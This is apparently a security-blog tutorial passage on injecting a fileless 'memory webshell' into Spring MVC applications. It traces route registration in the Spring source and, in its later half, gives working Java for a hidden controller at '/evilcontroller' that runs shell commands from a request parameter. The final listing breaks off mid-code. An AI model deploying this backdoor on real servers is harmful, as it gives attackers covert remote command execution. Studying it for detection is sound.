<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="c6fde1e6049e0b3e334b1f0db4a7c556">Spring内存马</h1>
<p>Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。</p>
<ul>
<li>
<p>IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现</p>
</li>
<li>
<p>Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一管理；Core为处理对象间关系的方法</p>
</li>
</ul>
<blockquote>
<p>依赖注入：把有依赖关系的类放到容器中，解析出这些类的实例</p>
</blockquote>
<p>spring对象间的依赖关系可以用配置文件的<code>&lt;bean&gt;</code>定义。context的顶级父类ApplicationContext继承了BeanFactory。</p>
<p>内存马一般的构造方式就是模拟组件注册，注入恶意组件</p>
<h2 data-content="1" id="a3b42d924b59000fb52aedaedde2f3d7">springMVC环境搭建</h2>
<p>新建maven项目，项目名右键添加web框架</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116171857-ce64204a-957e-1.png"/></p>
<p>配置tomcat：设置tomcat主目录以及Application context路径</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116171901-d0702b04-957e-1.png"/></p>
<p>pom.xml里加入sping MVC5.3.21以及其他依赖</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependencies&gt;</span>
        <span class="c">&lt;!-- SpringMVC --&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-webmvc<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>5.3.21<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>

        <span class="c">&lt;!-- 日志 --&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>ch.qos.logback<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>logback-classic<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>1.2.3<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>

        <span class="c">&lt;!-- ServletAPI --&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>

        <span class="c">&lt;!-- Spring5和Thymeleaf整合包 --&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.thymeleaf<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>thymeleaf-spring5<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.0.12.RELEASE<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;/dependencies&gt;</span>
</pre></div>
<p>在web.xml中添加DispatcherServlet。DispatcherServlet的主要作用将web请求，根据配置的URL pattern，将请求分发给Controller和View。</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;servlet&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>DispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
        <span class="nt">&lt;init-param&gt;</span>
            <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
            <span class="nt">&lt;param-value&gt;</span>classpath:SpringMVC.xml<span class="nt">&lt;/param-value&gt;</span>
        <span class="nt">&lt;/init-param&gt;</span>
        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
    <span class="nt">&lt;/servlet&gt;</span>
    <span class="nt">&lt;servlet-mapping&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>DispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
    <span class="nt">&lt;/servlet-mapping&gt;</span>
<span class="nt">&lt;listener&gt;</span>
        <span class="nt">&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="nt">&lt;/listener-class&gt;</span>
    <span class="nt">&lt;/listener&gt;</span>
</pre></div>
<p>在classpath，我这里是src/main/resources下创建SpringMVC.xml核心配置文件</p>
<p>创建TestController类：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springmvc</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestController</span> <span class="o">{</span>
    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/index"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">index</span><span class="o">(){</span>
        <span class="k">return</span> <span class="s">"index"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>修改SpringMVC.xml。这里sping会自动扫描base-package下的java文件，如果文件中有@Service,@Component,@Repository,@Controller等这些注解的类，则把这些类注册为bean</p>
<blockquote>
<p>属性use-default-filters=”false”表示不要使用默认的过滤器</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span>
       <span class="na">xmlns:context=</span><span class="s">"http://www.springframework.org/schema/context"</span>
       <span class="na">xmlns:mvc=</span><span class="s">"http://www.springframework.org/schema/mvc"</span>
       <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>

       <span class="na">xsi:schemaLocation=</span><span class="s">"</span>
<span class="s">        http://www.springframework.org/schema/beans</span>
<span class="s">        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span>
<span class="s">        http://www.springframework.org/schema/context</span>
<span class="s">        http://www.springframework.org/schema/context/spring-context-3.0.xsd</span>
<span class="s">        http://www.springframework.org/schema/mvc</span>
<span class="s">        http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;mvc:annotation-driven/&gt;</span>
    <span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">"org.example.springmvc"</span> <span class="nt">/&gt;</span>

    <span class="nt">&lt;bean</span>
            <span class="na">class=</span><span class="s">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"prefix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;value&gt;</span>/WEB-INF/<span class="nt">&lt;/value&gt;</span>
        <span class="nt">&lt;/property&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"suffix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;value&gt;</span>.jsp<span class="nt">&lt;/value&gt;</span>
        <span class="nt">&lt;/property&gt;</span>
    <span class="nt">&lt;/bean&gt;</span>
<span class="nt">&lt;/beans&gt;</span>
</pre></div>
<p>prefix表示路径，suffix指定后缀</p>
<p>在WEB-INF下创建lib目录，将可用库全部拖进去</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116171955-f069bd80-957e-1.png"/></p>
<p>当访问index时，返回index，根据SpringMVC.xml配置的prefix，去<code>/WEB-INF/</code>下寻找jsp后缀的文件。</p>
<p>比如在/WEB-INF/下存放index.jsp，访问index时会通过web.xml中导入的DispatcherServlet处理请求，DispatcherServlet发送到Controller注解类，也就是TestController# return index。然后由springMVC视图解析器去/WEB-INF/下寻找index且为jsp后缀的文件。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116171959-f30dafe2-957e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172003-f52c3f6e-957e-1.png"/></p>
<p>其实如果嫌配置麻烦，可以直接使用springboot。然后直接写Controller</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;parent&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-parent<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>2.4.5<span class="nt">&lt;/version&gt;</span>
    <span class="nt">&lt;relativePath/&gt;</span> <span class="c">&lt;!-- lookup parent from repository --&gt;</span>
<span class="nt">&lt;/parent&gt;</span>
</pre></div>
<h2 data-content="1" id="628b59bce7e9669a2c71d2629ed65ffc">基础知识</h2>
<h3 data-content="1" id="c77b1e450d372563b5e43df2cf52b0ce">controller</h3>
<p>Controller负责处理DispatcherServlet分发的请求。将用户请求处理后封装成model返回给view。</p>
<p>在springmvc中用@Controller标记一个类为Controller。然后用@RequestMapping等来定义URL请求和Controller方法间的映射</p>
<h3 data-content="1" id="fd7d421763eccf2c769befb0610a9078">ApplicationContext</h3>
<p>org.springframework.context.ApplicationContext接口代表了IoC容器，该接口继承了BeanFactory接口。</p>
<h3 data-content="1" id="b8c5fb50e5d6cd5f4ccae2b65ef0e32a">ContextLoaderListener</h3>
<p>用来初始化全局唯一的Root Context，也就是Root WebApplicationContext.该WebApplicationContext和其他子Context共享IOC容器，共享bean</p>
<p>访问和操作bean就需要获得当前环境ApplicationContext</p>
<h2 data-content="1" id="8deccba6f46e45b3c4116f8794597152">源码分析</h2>
<p>在Controller类打上断点，然后访问index</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172010-f97533aa-957e-1.png"/></p>
<h3 data-content="1" id="3a9bc6e7f27b180093381d577c988959">Controller的注册</h3>
<p>在DoDispatch处由DispatcherServlet处理web请求</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172014-fbbc524c-957e-1.png"/></p>
<p>在DispatcherServlet调用HandlerAdapter#handle处理request和response。并且此处用getHandler方法获取了mappedHandler的Handler</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172017-fe093e66-957e-1.png"/></p>
<p>往上看，mappedHandler是对handlerMappings进行遍历。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172021-0022541c-957f-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172025-026992da-957f-1.png"/></p>
<p>持续跟进mapping.getHandler(request)发现，AbstractHandlerMethodMapping#getHandlerInternal()中对mappingRegistry进行上锁，最后解锁。（不自觉想起了死锁）mappingRegistry存储了路由信息。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172028-0448137e-957f-1.png"/></p>
<p>在lookupHandlerMethod方法，从mappingRegistry中获取了路由</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172032-06821ce8-957f-1.png"/></p>
<p>也就是说模拟注册向mappingRegistry中添加内存马路由，就能注入内存马。</p>
<p>在AbstractHandlerMethodMapping中就提供了registryMapping添加路由。但是该类为抽象类。它的子类RequestMappingHandlerMapping能进行实例化</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172036-090158d0-957f-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172039-0b13e976-957f-1.png"/></p>
<h3 data-content="1" id="e515ded4512aac34d4545486d8851ced">RequestMappingHandlerMapping分析</h3>
<p>AbstractHandlerMethodMapping的afterProperties用于bean初始化</p>
<p>initHandlerMethod()遍历所有bean传入processCandidateBean处理bean，也就是controller</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172043-0d615b1e-957f-1.png"/></p>
<p>在processCandidateBean中，getType获取bean类型，通过isHandler进行类型判断，如果bean有controller或RequestMapping注解，就进入detectHandlerMethods解析bean</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172047-0f9b048e-957f-1.png"/></p>
<p>在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172051-11fcc974-957f-1.png"/></p>
<p>处理完后用registryHandlerMethod建立方法到RequestyMappingInfo的映射。也就是注册路由</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172055-1429ea42-957f-1.png"/></p>
<h4 data-content="1" id="26a541709dc7e8947914ae6d654774cb">mappingRegistry路由信息</h4>
<p>registry传入的参数mapping,handler,method。mapping存储了方法映射的URL路径。handler为controller对象。method为反射获取的方法</p>
<h2 data-content="1" id="bd341a06bfcb89cdab2ea2bd67eb6c67">Controller内存马构造</h2>
<h3 data-content="1" id="8ab7156452cc642b35ba15d9c05a74a8">1.获取WebApplicationContext</h3>
<p>在内存马的构造中，都会获取容器的context对象。在Tomcat中获取的是StandardContext，spring中获取的是<code>WebApplicationContext</code>。（在controller类声明处打上断点可以看到初始化<code>WebApplicationContext</code>的过程）WebApplicationContext继承了BeanFactory，所以能用getBean直接获取RequestMappingHandlerMapping，进而注册路由。</p>
<p>所以重点是如何获取WebApplicationContext</p>
<ul>
<li>
<p>原理：</p>
</li>
<li>
<p>获取WebApplicationContext:</p>
<p>由于webApplicationContext对象存放于servletContext中。并且键值为<code>WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</code></p>
<p>所以可以直接用servletContext#getAttribute()获取属性值</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContext</span> <span class="n">wac</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span><span class="n">servletContext</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">.</span><span class="na">ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</span><span class="o">);</span>
</pre></div>
<p>webApplicationContextUtils提供了下面两种方法获取webApplicationContext。需要传入servletContext</p>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContextUtils</span><span class="o">.</span><span class="na">getRequeiredWebApplicationContext</span><span class="o">(</span><span class="n">ServletContext</span> <span class="n">s</span><span class="o">);</span>
  <span class="n">WebApplicationContextUtils</span><span class="o">.</span><span class="na">getWebApplicationContext</span><span class="o">(</span><span class="n">ServletContext</span> <span class="n">s</span><span class="o">);</span>
</pre></div>
<blockquote>
<p>spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</p>
</blockquote>
<ul>
<li>
<p>获取ServletContext</p>
<p>通过request对象或者ContextLoader获取ServletContext</p>
<div class="highlight"><pre><span></span><span class="c1">// 1</span>
<span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
<span class="c1">// 2</span>
<span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">ContextLoader</span><span class="o">.</span><span class="na">getCurrentWebApplicationContext</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
</pre></div>
</li>
<li>
<p>获取request可以用RequestContextHolder</p>
<div class="highlight"><pre><span></span><span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span>
        <span class="o">.</span><span class="na">getRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">();</span>
</pre></div>
</li>
</ul>
<p>spring中获取context的方式一般有以下几种</p>
<p>①直接通过ContextLoader获取，不用再经过servletContext。不过ContextLoader一般会被ban</p>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">ContextLoader</span><span class="o">.</span><span class="na">getCurrentWebApplicationContext</span><span class="o">();</span>
</pre></div>
<p>②通过RequestContextHolder获取request，然后获取servletRequest后通过RequestContextUtils得到WebApplicationContext</p>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">getWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
</pre></div>
<p>③用RequestContextHolder直接从键值org.springframework.web.servlet.DispatcherServlet.CONTEXT中获取Context</p>
<div class="highlight"><pre><span></span><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
</pre></div>
<p>④直接反射获取WebApplicationContext</p>
<div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">filed</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.context.support.LiveBeansView"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"applicationContexts"</span><span class="o">);</span>
<span class="n">filed</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span> <span class="n">context</span> <span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span><span class="o">)</span> <span class="o">((</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashSet</span><span class="o">)</span><span class="n">filed</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">)).</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">();</span>
</pre></div>
<p>实际上常用的就2,3。</p>
<p>其中1获取的是Root WebApplicationContext，2，3通过RequestContextUtils获取的是叫dispatcherServlet-servlet的Child WebApplicationContext。</p>
<blockquote>
<p>在有些Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code> 、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 <code>servlet</code> 配置文件，这时候通过1方法是获取不到<code>Root WebApplicationContext</code>的。</p>
</blockquote>
<h3 data-content="1" id="9d30bd72204b1da1d41e6f52bdaaa546">2.模拟注册Controller</h3>
<p>在spring2.5-3.1使用DefaultAnnotationHandlerMapping处理URL映射。spring3.1以后使用RequestMappingHandlerMapping</p>
<p>模拟注册Controller的方式一般有三种：</p>
<p>①源码分析就介绍的，registryMapping直接注册requestMapping</p>
<p>直接通过getBean就能获取RequestMappingHandlerMapping</p>
<div class="highlight"><pre><span></span><span class="n">RequestMappingHandlerMapping</span> <span class="n">mappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<p>生成RequestMappingInfo。需要传入PatternsRequestCondition（Controller映射的URL）和RequestMethodsRequestCondition（HTTP请求方法）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172113-1ef21850-957f-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">PatternsRequestCondition</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PatternsRequestCondition</span><span class="o">(</span><span class="s">"/evilcontroller"</span><span class="o">);</span>

<span class="n">RequestMethodsRequestCondition</span> <span class="n">ms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMethodsRequestCondition</span><span class="o">();</span>

<span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMappingInfo</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">ms</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</pre></div>
<p>恶意Controller:</p>
<div class="highlight"><pre><span></span><span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectedController</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">InjectedController</span><span class="o">(){</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">cmd</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getRequest</span><span class="o">();</span>
        <span class="n">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getResponse</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)};</span>
            <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
            <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>反射获取shell方法</p>
<div class="highlight"><pre><span></span><span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">InjectedController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
</pre></div>
<p>调用ReqgistryMapping注册</p>
<div class="highlight"><pre><span></span><span class="n">requestMappingHandlerMapping</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">injectedController</span><span class="o">,</span> <span class="n">method</span><span class="o">);</span>
</pre></div>
<h3 data-content="1" id="6b3cd5f27dca8c8acac1db7fa35f667e">测试：</h3>
<ul>
<li>完整代码</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springmvc</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.PatternsRequestCondition</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectController</span> <span class="o">{</span>
    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/inject"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">inject</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>

        <span class="n">RequestMappingHandlerMapping</span> <span class="n">requestMappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

        <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">InjectedController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>

        <span class="n">PatternsRequestCondition</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PatternsRequestCondition</span><span class="o">(</span><span class="s">"/evilcontroller"</span><span class="o">);</span>

        <span class="n">RequestMethodsRequestCondition</span> <span class="n">condition</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMethodsRequestCondition</span><span class="o">();</span>

